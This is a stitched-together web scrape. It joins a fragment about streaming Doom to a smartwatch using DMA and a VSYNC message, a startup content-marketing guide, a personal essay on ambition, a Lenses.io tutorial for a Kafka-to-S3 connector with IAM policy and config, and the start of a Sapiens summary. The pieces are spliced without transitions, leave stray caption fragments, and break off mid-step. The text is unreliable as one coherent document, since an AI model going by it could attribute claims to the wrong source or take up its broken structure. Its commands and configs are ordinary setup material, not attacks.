<p>The source lives in the <a href="https://github.com/jborza/watch-doom-receiver/blob/multithreaded/watch-doom-receiver.ino"><code>multithreaded</code> branch</a> - but it didn’t really work faster, which lead me to the next attempt:</p>

<h3 id="using-dma-for-the-speed">Using DMA for the speed</h3>

<p>What helped in the end was using Direct Memory Access (DMA) transfer using `  tft-&gt;pushPixelsDMA(lineBuffer, DISPLAY_LINE_LENGTH);`. It’s basically “fire and forget” data transfer - the controller will move the data from the RAM to the display and practically allow the microcontroller to execute other code as opposed to operating the SPI bus.</p>

<p>Now I could increase the baudrate to 921600 and practically double the framerate.</p>

<h4 id="vertical-synchronization">Vertical Synchronization?</h4>

<p>If we just dump the data to the screen without some kind of synchronization or alignment, the device wouldn’t know where the boundary between the frame data lies.</p>

<p>It also means we would need to be lucky to start the transmission in sync with the watch displaying the first row of the frame data.</p>

<p>To fix this, I added a simple VSYNC message that the watch sends to the PC over the serial port when it starts drawing the first row. Upon receiving VSYNC, the PC should start abandon the current frame and start sending another frame from the beginning. I’ve added a handler for this to the python support tools, but decided not to for Doom as it was easier to just reset the line currently being drawn if no data has come for a while across the serial port.</p>

<h2 id="finishing-touches">Finishing touches</h2>

<p>A series of color schemes livens up the 1-bit color depth - just black and white is kind of boring. This has a straightforward implementation on the T-Watch side, reacting to the touch of the touchscreen with <code>digitalRead(...)</code></p>

<p>Content marketing can be overwhelming for a business until the budget is there for bigger longterm communications programs. If you’re a startup owner or solo marketing manager, you’re already doing a lot with a little. But if you’re building a company, the time is already here to get started on content marketing, because content marketing is a long game that takes time and is an integral part of brand building. Many startups give up too soon, but you can handle content marketing, whether you do it yourself or hire it out. It doesn’t have to be fancy, but it does have to be focused in a few particular ways to succeed over time. You can start your own content marketing if you stay focused and don’t let initial slow traction get you down.</p>



<p>Cronicle Consulting presents a short Content Series: 5 Ways To Start Content Marketing For Your Tech Startup. This series will be split into 5 sections so stay tuned for the next articles. First up, starting a company blog. It’s the simplest way to start content marketing from day 1, and it will bring in results if you do it right. But most people don’t know how to focus their blog for optimum results, so it feels like a waste of time. That’s why we’re here to help you avoid common content marketing errors before you begin. Note: SEO is its own important topic and won’t be covered in the scope of this article.</p>



<h2>Content Marketing Plan #1: Company Blog</h2>



<p>Content marketing in a company blog not just about the content showing professional expertise or announcing company news. People want to know:</p>



<ol><li>what you’re like to work with.</li><li>how you view the world within your professional sphere.</li><li>how you communicate.</li></ol>



<p>Your blog is where prospective clients go to see how you interact with the world. When you start your company blog, begin by announcing the launch of the company. Then, tell your team story. Here are a few ideas to get started.</p>



<h3>Content Marketing Ideas For A Blog</h3>



<ol><li>tell your team story.</li><li>talk about the problem your product or service is solving in the world or what cause you are supporting.</li><li>announce new hires.</li><li>post job listings.</li><li>tell the story of company volunteering.</li><li>publish white papers and awards.</li><li>announce events and promotions.</li><li>publish your own industry research reports or host your own awards.</li><li>turn engineering expertise into mini e-books or published papers.</li><li>host round tables interviewing industry experts.</li><li>cover industry news.</li></ol>



<p>If you need to hire your company blog out to a communications firm, check out their other client blogs and see if they are matching the tone and content to the industry and if they know their technical stuff in depth. If all the blogs for various clients in different industries sound the same or too high level, move on to a different firm. Tech startups in particular have this problem. Addressing it early can help you avoid wasting your efforts. </p>

These days they are competitions, media exposure, and an opportunity to create print content and a community that grows over time. </figcaption></figure>



<h2>Tone, Focus &amp; Style in a Company Blog</h2>



<p>The tone of your company blog is critical: the vocabulary has to be right for the professional space being addressed, the focus of the content interesting to people in your field or your client space, and the communication style appropriate to your industry. Is the communication style in your space more formal or jocular? Is it interested in the broader social good, or does your circle tend to focus on technical details of research and problem solving industry issues? Once you get the hang of focus through trial and error and having someone with industry-specific content expertise create your blog, a company blog is one of the best ways to keep your website popping up in organic search results on topics potential clients are searching for, and you’ve pre-sold a lot of people on working with your team. </p>



<h3>Appropriate Blog Tone Varies By Industry</h3>



<p>We cannot emphasize enough getting the tone right. The problem with content marketing is that it falls to the marketing folks most of the time instead of an in-house journalist, which only larger companies have budget for. If you are a marketing manager versed in content that’s great. If you’re not sure if you’re doing this correctly, one way to check is to make sure you don’t use quite the same tone for sales copy as you do for the company blog. Think about the tone of how people within the organization communicate with each other and with clients, and use that as a guide instead. Why? Because it all begins to sound like a sales pitch otherwise, and that is not at all what content is for. Client storytelling works best when it’s done in the tone that makes people sound the most professional, or the friendliest, or the best suited to solve a client’s problems. Sales copy often accomplishes this only in direct pitches. </p>



<h3>You Are Not The Hero Of The Story, You Are The Bard</h3>



<p>Content is your chance to provide good will to the world, information for free that benefits them. The best way to do this is to talk about causes your company believes in, promote the good work of colleagues, and position yourself as the cheerleader to someone else as the hero of the story. If it starts to sound like “we have the best culture, look how amazing our culture is at this workplace here, check us out, guys” it’s going to turn a lot of people off subconsciously to listening to what you actually have to offer. What you actually have to offer is a whole lot of wisdom and thought leadership that the world probably needs. The aim here is to tell the story you want to tell, but think of yourself as the support role or the cheerleader, not the hero. Just that simple shift will make your story sound so much more beneficial to the reader, and will cut out the feeling of awkwardness that can come from self-promotion.</p>

Creating, publishing, or sponsoring a report like this can be very useful content. </figcaption></figure>



<h3>Company Blog Style Is Tailored To The Blog’s Purpose</h3>



<p>Keep company blog content styled in a way that fits your brand and how you want to present your organization to the world. This often swings several directions off track.</p>



<h4>Common Company Blog Errors:</h4>



<ol><li>Your company blog sounds too much like a sales pitch for culture.</li><li>Your company blog is all jargon and no specifics on your offerings.</li><li>Your company blog is all about your company.</li></ol>



<p>Number 1 depends on if you work in an industry that relies heavily on people’s buy-in to a particular culture. Some company blogs do get away with a particular tone that sounds almost cultish, but often this is a turnoff for prospective hires and clients. To avoid this common mistake in a world of business websites that are nothing but culture pitch, focus on the benefit to the client. What do they want to know about? What are they searching for? What helps them? It’s a great approach for creating content that people are more likely to be searching for anyway. </p>



<p>Number 2 is actually debatable. There are industries in which a jargon-heavy website is appropriate. “We deliver on deadline on spec with the most disruptive innovation imaginable.” Except what do you deliver? Well, sometimes industries communicate exclusively in industry jargon, and that’s properly communicating professional expertise and the right pitch. But it does wear thin on long-form content. If you work in an industry that’s super jargon heavy, try to keep the jargon to the static pages, and the blog should go more in depth into what you’re working on, as much as you can afford to share. Many industries such as automotive, advanced manufacturing, defense contracting, and the like are not able to publish the same kind of company blog because of NDAs and heavy restrictions on proprietary information. Biotech would be another good example. You want clients to know what you could offer them, but all details are often available in house after demos and personal contact with a client and most sales handled directly. In this case, if you still want to publish a company blog, keep it to the new hires, press releases, new services offered, and details of presentations from trade shows, which can be fun to read about. </p>



<p>Number 3 is tricky. Many company blogs don’t have time to move past basic company press releases, but if you can make the time, reporting on industry news can be one of the most powerful ways to establish your company as an industry leader in the space. The style of your blog needs to be determined by whom you are serving. Biotech companies often focus very much on direct sales to clients, but a security startup needs to establish themselves as a leader in the industry thought leadership space. Their blog should be focused on industry standards, industry problem solving, and innovative solutions and conversations that serve the broader space. </p>



<p>But everyone’s already doing this these days, right? Not quite. It takes a good marketing manager or journalist to spot the common flaw. Most company blogs talk about the company or their ability or authority to report on industry news far more than they produce actual content that is valuable to the reader. Journalism requires funding, and it doesn’t come for free even if the cost is giving your marketing team space to produce quality content in house. This is where companies think content marketing doesn’t work and tend to fall off over time to focus on other marketing. If your company promotes themselves as an industry thought leader but only talks about how central they are to the ecosystem and how many events they’re hosting or attending to prove their relevance, they can come across as insecure or bragging or …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-606e3fb9ac8364badb5c"><div><p>When we are kids, we have many aspirational dreams and ambitious goals. <strong>You want to eat the world. </strong>Then, when you’re an adult, <strong>the world eats you.&nbsp;</strong></p><p>We grow up, and the same dreams become impossible or we stop pursuing them. But why? Was it because our dreams were straight-up stupid? Or because we settled and decided they were impossible?&nbsp;</p><p>I want to explore this question as a kid who <strong>still</strong> has lots of ambitious dreams and <strong>wants</strong> <strong>to eat the world.&nbsp;</strong></p><p>Lately, I’ve experienced that my goals and dreams might be stupid or impossible. But why? If I think they are. They will be impossible because I won’t even try. I have to keep reminding myself that they are not and keep believing they are and can be possible.&nbsp;</p><p><strong>Ambition starts fragile</strong>, we need to feed it to keep going[1]. Steven Spielberg said, “Dreams always come from behind you, not right between your eyes. But when you have a dream, it doesn’t often come at you screaming in your face...Sometimes the dream almost whispers.” And you have to <strong>listen</strong> very <strong>carefully</strong>...</p><p>Ambition has more to do with <em>listening carefully </em>than it is with anything else. You need to be sensitive to <strong>what you want </strong>and <strong>why you want it.&nbsp;</strong></p><p>Ambition can be grown and cared for like a garden. You start small and you constantly prune and iterate it.&nbsp;</p><p>Ask yourself what you love and what sacrifices you’re willing to make to pursue your goals.&nbsp;</p><p>Many people don’t just lose their ambition (some get even more ambitious as they get older) but most people don’t ask themselves these questions and life happens to them.&nbsp;</p><p><strong>I’ve realized that being ambitious isn’t about trying to become rich or famous, but more about knowing what you want and why you want it. Once you know that, you’ll be more likely to sacrifice and push through all the obligations and randomness of life, and finally accomplish your dreams.&nbsp;</strong></p><p>So, <strong>Why the fuck do we lose our ambition when we grow up?</strong></p><p>Losing our ambition is like losing our soul and excitement to be alive. We’re saying, “Nope, I refuse to fully live.” Being ambitious isn’t about becoming famous or billionaire. It’s about fully living.</p><p>Socrates said once, “The unexamined life is not worth living,” meaning living a life under the rule of others, never questioning what you want out of it is not <strong>worth</strong> <strong>living. </strong>&nbsp;And let me make sure you know this too, a life with no aim and with no purpose isn’t an alternative either.&nbsp;</p><p>If you’re young or whatever age you are, and want to be ambitious. Be aware of the reasons people lose their ambition.&nbsp; What are those reasons? There are many reasons, but there’s one that expresses the essential reasons: <strong>Change of priorities.&nbsp;</strong></p><p>People get comfortable, which makes them lose sight of the big picture, and you add responsibilities and obligations. You get the average adult. This is often true, but not always. Sometimes, people change what they’re ambitious for. Kids want to be astronauts, teens want to change the world, and adults want to spend time with their families.&nbsp;</p><p>Which is one right? Neither. You choose. The issue occurs when your priorities change without you realizing it. You may WANT to change your priorities, just be aware of the WHY.&nbsp;</p><p>Even if you don’t change your priorities, there’s another reason that is probably the biggest contributor.</p><p>“Everyone wants to be a published author, nobody wants to write a book.” This isn’t about becoming a published author, but an example of a high-status goal that many people grow up aspiring to, that turns out to require you to work hard over a long time.&nbsp;</p><p><a href="https://www.kalzumeus.com/" target="_blank">Patrick McKenzie </a>elaborates more on this idea and says, “One of my most disconcerting observations about the world is that the number of people who will, in their life, pursue a concrete goal with focus and determination for several months is *much much lower* than what I would have assumed it would be.”&nbsp;</p><p>Why are some people more determined than others? Or why do others never give despite failing repeatedly? A harsh truth many people refuse to accept.&nbsp;</p><h2>Destined to Fail, Arriving Successfully</h2><p>Look, youngsters my age (17) or older haven’t experienced true failure in their life. Why? Most of them because they haven’t really tried anything. To fail, you have to try. If you never try, you never fail.&nbsp;</p><p>Since early on, we take pre-planned paths such as standardized testing and getting A’s. As long as you do nothing dumb and do what teachers tell you, you will be fairly successful. Just be complacent and follow others. Simple, right?<br></p><p>Real-life is not like that.&nbsp;</p><p>Once you graduate college and you are finally dropped off at the so-called “real world” with no instructions. Most people struggle with how to be <strong>successful. </strong>You try things and you fail.&nbsp;</p><p>The first failures are rough because you aren’t used to them, so they are cruelly painful. Like when you told that one girl in fourth grade you liked her, but she rejected you. Well, maybe it’s not that painful.&nbsp;</p><p>You try things and you fail. Then one of two things takes place. You either try again and learn and improve or you avoid pain altogether.&nbsp;</p><p>Again, neither is right nor wrong. Each one comes with pros and cons.&nbsp;</p><p>The first option of trying things and failing is a lot tougher short-term but benefits people long term. Few people take this road because humans love <strong>comfort </strong>and avoid <strong>pain.&nbsp;</strong></p><p>The second option of avoiding pain is far more common and causes people to stick with jobs and careers they don’t like because it’s “too hard” to change. This road is easier in the short-term but leads many people to become depressed and “giving up,” which is what I’m talking about when people grow up and “lose ambition.”</p><p>Enough of my ranting. How do you know what road to take?&nbsp;</p><h2>Choose a life that makes sense to YOU!</h2><p>Every young person wants to be unique. We want to dream and we want to inspire others. But that doesn’t always happen because lots of times it’s easier to follow what <strong>others say </strong>and do what<strong> others do.&nbsp;</strong></p><p>Many people reason by analogy (because someone did it), and few reason by truths or <a href="https://www.techtello.com/first-principles-thinking/" target="_blank">first principles</a> (what do I think is true for sure?).&nbsp;</p><p>To think for yourself independently of others takes more mental output and yes it’s freaking hard, but only if you do, you can start <strong>fully living.&nbsp;</strong></p><p>Being ambitious isn’t for everyone, but most people should dare to try it. Yes, it’s harder, tiring, and perhaps even meaningless. But I’m still ambitious.</p><p>Nothing that we’ll ever do will matter. Nothing. If you look at the world not in years or centuries, but in billions of years. Few things will matter. So why even bother?</p><p>At first, you may become nihilistic but if you look at it more carefully, you’ll realize that because nothing will matter, you might as well try to optimize every minute you live by helping others, being happier, loving more, and being more ambitious.&nbsp;</p><h2>I Refuse to Wait</h2><p><strong>Young Human:</strong> I want to eat the world.</p><p><strong>Old Human:</strong> Try to not get eaten first, kid.</p><p><strong>Young Human:</strong> (says nothing and thinks to himself, “Who was the weirdo who looks like he was eaten?”</p><p><strong>Old Human: </strong>You’ll understand…</p><p>___________</p><p>Perhaps I’m dumb for trying to be ambitious and even dumber for trying to help others to see if being ambitious makes sense for them. Like <a href="https://twitter.com/Lexstok/status/1309371088498053120?s=20" target="_blank">someone told me on Twitter</a>, “Bookmark this tweet, set a timer for 20 years, and you’ll be able to answer this yourself by then.”</p><p>But I refuse to wait twenty years. I would rather try to learn from the mistakes of other people and have an answer that makes sense for me. An answer that aligns with what I think, what I say, and what I do.&nbsp;</p><p>That answer is that being ambitious is worth it. It’s not about being rich or famous but understanding what you want and why you want it while treating ambition like a garden that can be grown and cared for.&nbsp;</p><p>If you can listen carefully and <em>garden </em>your ambition, you can start <strong>fully living</strong> the life you want and choose for yourself.&nbsp;</p><p>Also, remember priorities might change. You thought you wanted to be an astronaut, but now all you want to do is play with your toddler and help him/her accomplish their dreams. Life is always beautiful, just make sure you’re the one planting the flowers in the <em>garden</em>.</p><p>If you decide you want to be ambitious, understand you may fail, and once you fail. That failure will take you back to the fourth grade but keep going, you may want to find friends who are ambitious, optimistic, and driven because they will be the one who will hold you accountable and help you when you fail.&nbsp;</p><p>And if you remember anything from this essay, remember that everything and anything you do won’t matter and will be meaningless. All the hard work, all the stress, and all the worries will be meaningless. But if that is true, you optimize for doing what makes you happy, for trying to help others, and perhaps being more <strong>ambitious</strong>.</p><p>Now, I’m starving. Let’s eat the world!</p><p><strong>Notes</strong></p><p><strong>[1]</strong> Think of ambition as 'feeding' as a small but consistent habit. Every action is a vote for who you will become and what you will achieve. This is how you build ambition.&nbsp;</p><p><strong>Thanks</strong> to my friends in my dorm who inspired me to write this essay after hours of deep conversations and discussions! Thanks guys!</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1601195872853_6856"><p>If you’re into interesting ideas (like the one you just read), sign up for my<a href="https://juandavidcampolargo.com/blog/newsletter"> </a><a href="https://juandavidcampolargo.com/newsletter" target="_blank">Weekly Memos</a>, and I’ll send you new essays right when they come out.

This defines how to map data from the source (in this case Kafka) to the target (S3).&nbsp;</p><p>Importantly, it also includes how data should be partitioned into S3, the bucket names and the serialization format (support includes JSON, Avro, Parquet, Text, CSV and binary).&nbsp;</p><p>The syntax looks like this:</p><pre>INSERT&nbsp;INTO&nbsp;bucketAddress:pathPrefix&nbsp;</pre><pre></pre><pre>SELECT&nbsp;*&nbsp;</pre><pre></pre><pre>FROM&nbsp;kafka-topic</pre><pre></pre><pre>[PARTITIONBY&nbsp;(partition[,&nbsp;partition]&nbsp;...)]</pre><pre></pre><pre>[STOREAS&nbsp;storage_format]</pre><pre></pre><pre>[WITHPARTITIONER&nbsp;partitioner]</pre><pre></pre><pre>[WITH_FLUSH_SIZE&nbsp;flush_size]</pre><pre></pre><pre>[WITH_FLUSH_INTERVAL&nbsp;flush_interval]</pre><pre></pre><pre>[WITH_FLUSH_COUNT&nbsp;flush_count]</pre><p>Full docs for the syntax can be found <a href="https://docs.lenses.io/4.0/integrations/connectors/stream-reactor/sinks/s3sinkconnector/">here</a>. </p><p>The connector supports a number of different authentication mechanisms to the S3 bucket including standard AWS Credentials (using an access and secret key) and via an <a target="_blank" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html">IAM role for EC2</a>. </p><p>Where credentials are needed, the Lenses <a href="https://docs.lenses.io/4.0/integrations/connectors/secret-providers/">secret manager plugins</a> allow you to integrate with common key management solutions such as Hashicorp Vault and AWS Secret Manager.&nbsp;</p><h2>Increased control &amp; pipeline as code</h2><p>Having control over how the data is structured whilst being sinked allows you to optimize for specific use cases, workloads and read patterns by downstream applications (such as Snowflake or AWS Athena, Glue etc.) and cost. And you avoid having to build and deploy complex stream processing workloads prior to sending to S3.&nbsp;</p><p>Like all Stream Reactor and Kafka Connect connectors, the connector can be managed via your traditional deployment tools and frameworks or can be managed through Lenses. This adds a layer of RBAC, governance, auditing, error handling and monitoring to how to manage Kafka connectors.&nbsp;</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/2ilwBPRzbKXMrVh6ZyOwOT/63686c9c5ba9486b37b32289bcfe57cb/lenses.io_aws_s3_connector_avro_to_parquet_diagram_apache_kafka__1_.png" alt="Lenses.io Apache Kafka Connector for S3 - "></p><p>The whole workload defined as Connect configuration &amp; SQL helps you manage data pipelines as configuration and over <a href="https://lenses.io/blog/2020/09/kafka-gitops-with-dataops/">GitOps</a>.</p><h2>S3 sink walkthrough</h2><p>Let’s assume a scenario where we have records in a Kafka topic <code>backblaze_smart</code> related to manufacturing process failures for certain products and events need to be stored in an S3 bucket.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/XuUivdv6bjSfEHU0GcgR3/2cdac904d91918ccf9c1e95f3c833344/manufaturing_data_failure_events__1_.png" alt="manufacturing data failure events in Lenses.io "></p><p>Downstream analytics solutions (such as AWS Athena) run by different Data teams for each model need access to this data.&nbsp;</p><p>For a read-performance and cost reason, the Data team asks that messages related to each model be partitioned into different objects within the S3 bucket and with a particular naming convention and placed in a <code>manufacturing_failures</code> folder.</p><p>The KCQL we will use in our connector configuration is therefore:</p><p><code>connect.s3.kcql=INSERT&nbsp;INTO&nbsp;Manufacturing:manufacturing_failures&nbsp;SELECT&nbsp;serial_number,&nbsp;model,&nbsp;capacity_bytes,&nbsp;failure&nbsp;FROM&nbsp;backblaze_smart&nbsp;PARTITIONBY&nbsp;model&nbsp;STOREAS&nbsp;`Json`&nbsp;WITH_FLUSH_COUNT&nbsp;=&nbsp;300&nbsp;</code></p><h2>Setting the environment</h2><p>Here's a walkthrough of testing out the connector. It will involve the following processes:</p><ul><li><p> <!-- -->Creating an S3 Bucket&nbsp;</p></li><li><p> <!-- -->Creating an IAM role with access to bucket</p></li><li><p> <!-- -->Running the Lenses Box docker on EC2</p></li><li><p> <!-- -->Configuring the connector in Lenses Box with EC2 authentication.</p></li></ul><p>The Lenses.io Box is a free all-in-one Kafka + Lenses development docker. It’s a <a href="https://lenses.io/blog/2020/06/perfect-environment-learn-develop-apache-kafka/">perfect environment</a> for developing real-time applications and testing connectors and it comes with sample data.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/6RVhN71PseZkkbUiaO1PFZ/9956b3ed4a68cccbdbdaf994929c9ea8/lenses.io_box_aws_s3_connector__1_.png" alt="Lenses.io AWS S3 Connector for Kafka Connect with Lenses Box"></p><p>If you prefer to use your own Lenses or Kafka Connect environment, you can download the connector from <a href="https://lenses.io/connect/kafka-to-aws-s3/">here</a> and request a free trial of Lenses from lenses.io/start.&nbsp;</p><p>We will create an IAM role in order to configure EC2 authentication to access the S3 bucket. If you’re not running Lenses Box on an EC2 instance, this won’t be necessary but you’ll need to provide an <a target="_blank" href="https://aws.amazon.com/premiumsupport/knowledge-center/create-access-key/">Access and Secret key</a> to write to S3 instead.&nbsp;</p><h2>Prerequisites</h2><p>For this walkthrough, you should have the following prerequisites:</p><ul><li><p> <a target="_blank" href="https://signin.aws.amazon.com/signin?redirect_uri=https%3A%2F%2Fportal.aws.amazon.com%2Fbilling%2Fsignup%2Fresume&amp;client_id=signup">AWS account</a>.</p></li><li><p> <!-- -->Access to the AWS management console with permissions to manage applications.</p></li><li><p> <!-- -->A host to run a docker container with 4GB RAM</p></li></ul><h2>Step 1: Create an S3 bucket</h2><p>1. 	Sign in to the AWS Management Console and open the <a target="_blank" href="https://console.aws.amazon.com/s3/">Amazon S3 console</a></p><p>2. 	Choose <b>Create bucket</b>.</p><p>3. 	In <b>Bucket name, </b>enter a name for your bucket &lt;BUCKETNAME&gt;. Do not use hyphens or other special characters. This is a requirement of the connector later.</p><p>4. 	Leave checked <b>Block All Public Access</b> and other settings as default.</p><p>5. 	Choose <b>Create bucket</b></p><p>Take note of your AWS region of your bucket as you’ll need this later.&nbsp;</p><h2>Step 2: Create an IAM role</h2><p>For the EC2 authentication to work, you must create an IAM role before you can launch the instance that will run Kafka Connect (the Lenses Box docker is packaged with Kafka Connect). </p><p>With the IAM role created,&nbsp; it will be attached to an instance running Kafka Connect/Box.&nbsp;</p><p>Alternatively, if you will authenticate to the S3 bucket with AWS Secret and Access keys instead, follow the processes described <a target="_blank" href="https://aws.amazon.com/premiumsupport/knowledge-center/create-access-key/">here</a>.</p><p><b>To create an IAM role using the IAM console</b></p><p>1. 	Open the <a target="_blank" href="https://console.aws.amazon.com/iam/">IAM console</a></p><p>2. 	In the navigation pane, choose <b>Roles</b>, <b>Create role</b>.</p><p>3. 	On the <b>Select role type</b> page, choose <b>EC2</b> and the <b>EC2</b> use case.

Choose <b>Create policy</b> to open the policy creation browser tab.</p><p>5. 	Open the JSON editor and paste the following policy, replacing the bucket name with the name of your bucket.</p><p>This policy allows access to the S3 bucket and also to the Kafka functions we will need later.&nbsp;&nbsp;</p><pre>{</pre><pre></pre><pre>	"Version":&nbsp;"2012-10-17",</pre><pre></pre><pre>	"Statement":&nbsp;[</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;	{</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"Sid":&nbsp;"1",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"Effect":&nbsp;"Allow",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"Action":&nbsp;[</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"s3:PutObject",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"s3:GetObject",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"s3:ListBucket",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"s3:DeleteObject"</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	],</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"Resource":&nbsp;[</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"arn:aws:s3:::&lt;BUCKETNAME&gt;",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	"arn:aws:s3:::&lt;BUCKETNAME&gt;/*"</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	]</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;	}</pre><pre></pre><pre>	]</pre><pre></pre><pre>}</pre><p>6.

Depending on which other services you want to access, you may want to open up certain ports (but not essential for this walkthrough).&nbsp;</p><p>1.        Request a Box license key for free from: <a href="https://lenses.io/box/">https://lenses.io/box/</a>. You’ll receive an email with a docker run command</p><p>2.       Run the command on your EC2 instance. It should look like this: </p><p><code>docker&nbsp;run&nbsp;-e&nbsp;ADV_HOST=127.0.0.1&nbsp;\</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e&nbsp;EULA="https://dl.lenses.io/d/?id=REGISTER_FOR_KEY"&nbsp;\</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--rm&nbsp;-p&nbsp;3030:3030&nbsp;-p&nbsp;9092:9092&nbsp;lensesio/box:latest</code></p><p>Note: if you want to configure your own external producers/consumers to this instance, set the <code>ADV_HOST</code> address accordingly.&nbsp; But you’ll need to ensure you open up port 9092 in the security group too.&nbsp;</p><h2>Step 4: Access Lenses and verify data</h2><p>1.	Access Lenses through your browser on port 3030.</p><p>2.	The “Explore” page acts as a real-time data catalog. Search for the <code>backblaze_smart</code> topic. This topic includes real-time flow from a sample producer within the Box environment.&nbsp;</p><p>This will be the data we sink to S3.&nbsp;</p><p>3.	To be more precise about which fields to sink to S3, from within the SQL Studio run the statement</p><p><code>SELECT&nbsp;serial_number,&nbsp;model,&nbsp;capacity_bytes,&nbsp;failure&nbsp;FROM&nbsp;backblaze_smart</code></p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/45oPl7DM6oPkghreCfvRJs/6c96121fe28619561e0ec9e9a5fc9e62/lenses.io_Sql_studio_aws_s3_connector__1_.png" alt="lenses.io Sql studio aws s3 connector"></p><h2>Step 5: Configure the S3 Connector through Lenses.io</h2><p>1.	It’s often a good idea to ensure you have access to the S3 bucket from within your environment using the AWS CLI.&nbsp;</p><p>Configure the CLI client with the command:</p><p><code>aws&nbsp;configure</code></p><p>And then at least ensure you can ls the contents of your bucket:</p><p><code>aws&nbsp;s3&nbsp;ls&nbsp;MyBucketName</code></p><p>Full instructions can be found <a target="_blank" href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3.html">here</a>. </p><p>2.	If successfully accessing the bucket, from within Lenses, select “Connectors” from the top level menu. A number of sample connectors should already be configured in Box.&nbsp;</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/3Rg89Ga3wxoYWuik0D9f8h/7a10b7aca70559f8853ad07bf50a7b9a/Lenses.io_box_connectors_kafka_connect__1_.png" alt="Lenses.io box connectors kafka connect"></p><p>3.	Click <b>New Connector</b>. Lenses will list all the available Connectors that are packaged by default in Box.</p><p>4.	Select the <b>S3 Connector</b></p><p>5.	Enter the details of the Connector. Take care to update the region of your S3 bucket in the parameters <code>aws.custom.endpoint</code> &amp; <code>aws.region</code>.<code>&nbsp;</code>Ensure to update the bucket name <code>MyBucketName</code> with the bucket created earlier in the <code>connect.s3.kcql</code> parameter.&nbsp;</p><pre>connector.class=io.lenses.streamreactor.connect.aws.s3.sink.S3SinkConnector</pre><pre></pre><pre>errors.retry.timeout=0</pre><pre></pre><pre>errors.log.include.messages=false</pre><pre></pre><pre>tasks.max=1</pre><pre></pre><pre>topics=backblaze_smart</pre><pre></pre><pre>errors.retry.delay.max.ms=60000</pre><pre></pre><pre>errors.deadletterqueue.context.headers.enable=false</pre><pre></pre><pre>key.converter.schemas.enable=false</pre><pre></pre><pre>connect.s3.kcql=INSERT&nbsp;INTO&nbsp;MyBucketName:manufacturing_failures&nbsp;SELECT&nbsp;serial_number,&nbsp;model,&nbsp;capacity_bytes,&nbsp;failure&nbsp;FROM&nbsp;backblaze_smart&nbsp;PARTITIONBY&nbsp;model&nbsp;STOREAS&nbsp;`Json`&nbsp;WITH_FLUSH_COUNT&nbsp;=&nbsp;3&nbsp;</pre><pre></pre><pre>aws.region=eu-west-3</pre><pre></pre><pre>errors.deadletterqueue.topic.name=s3dlq</pre><pre></pre><pre>aws.custom.endpoint=https://s3.eu-west-3.amazonaws.com/</pre><pre></pre><pre>value.converter.schemas.enable=false</pre><pre></pre><pre>name=S3Example</pre><pre></pre><pre>errors.tolerance=none</pre><pre></pre><pre>errors.deadletterqueue.topic.replication.factor=1</pre><pre></pre><pre>aws.vhost.bucket=false</pre><pre></pre><pre>value.converter=org.apache.kafka.connect.json.JsonConverter</pre><pre></pre><pre>config.action.reload=restart</pre><pre></pre><pre>errors.log.enable=true</pre><pre></pre><pre>key.converter=org.apache.kafka.connect.json.JsonConverter</pre><pre></pre><pre>schemas.enable=false</pre><p><img src="https://images.ctfassets.net/tnuaj0t7r912/3cgpERxTROGXCNNejPwclJ/d288484fd2993178df91610577a4464d/lenses.io_aws_s3_connector_kafka_connect_configuration.png" alt="lenses.io aws s3 connector kafka connect configuration"></p><p>If you're using credentials to authenticate instead of EC2, enter a secret and access key. </p><pre>aws.secret.key=SECRET_KEY</pre><pre></pre><pre>aws.access.key=ACCESS_KEY</pre><p>6.

<p>I spent over 25 hours building a cut-down version of Sapiens. The goal? Future-me should be happy to read this once future-me forgets how we evolved. It’s massive for a blog post, just under 30 minutes, but that’s the best I could do, condensing 9 hours worth of material.</p>

<p>I’ve tried to keep editing to a minimum: It’s the original text, edited to ensure it still flows like the book.</p>

<p>You can get the book <a href="https://amzn.to/2WWNsjq" target="_blank" rel="noopener">here</a><sup id="fnref:2"><a href="#fn:2">1</a></sup></p>

<p>What caused our brains to develop? We’re not sure.</p>

